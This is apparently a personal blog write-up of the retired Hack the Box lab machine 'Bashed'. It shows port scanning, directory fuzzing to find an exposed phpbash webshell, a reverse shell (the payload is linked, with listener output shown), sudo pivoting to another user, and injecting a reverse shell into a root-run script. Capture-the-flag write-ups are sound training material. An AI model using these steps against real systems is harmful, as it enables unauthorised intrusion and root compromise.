---
layout: post
title: Hack the Box - Bashed
date: 2020-04-25 22:19:22 +0100
description: Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.
img: bashed.png
fig-caption: Bashed
categories: HackTheBox
tags: [Easy, Linux, Retired, CTF]
---
## Overview
Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
└─$ sudo nmap -p- -T4  10.129.113.137
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 22:30 GMT
Nmap scan report for 10.129.113.137
Host is up (0.018s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
```
As only port 80 is exposed I tried to access it in a browser. The website your greeted with states that [phpbash](https://github.com/Arrexel/phpbash) is located somewhere on the server. So fuzzing would appear to be the approach.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.113.137/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.113.137/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 7742, Words: 2956, Lines: 162]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
php                     [Status: 301, Size: 314, Words: 20, Lines: 10]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 314, Words: 20, Lines: 10]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10]
```
As dev appears to be nonstandard I looked in that directory and found the webshell.
## Foothold
To gain the foothold at this point is simple so I just used a python one-liner to send back a reverse shell [Python Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
└─$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.137] 33262
www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data
```
## Privilege Escalation
When I receive the shell, on linux the first check I always perform is to upload linpeas. From the output I see that the current user can execute commands as the scriptmanager user.
```
www-data@bashed:/home/scriptmanager$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager bash
sudo -u scriptmanager bash
scriptmanager@bashed:~$ whoami
whoami
scriptmanager
```
Now that we are the scriptmanager user we have access to the scripts directory located in the root directory. In there we notice there is a python file that we can edit, however there is an output file that is owned by root. This indicates that the script is run by root. So if we enter a reverse shell into the script it should give us a root shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
└─$ nc -nlvp 4342             
listening on [any] 4342 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.137] 36588
root@bashed:/scripts# whoami
whoami
root
```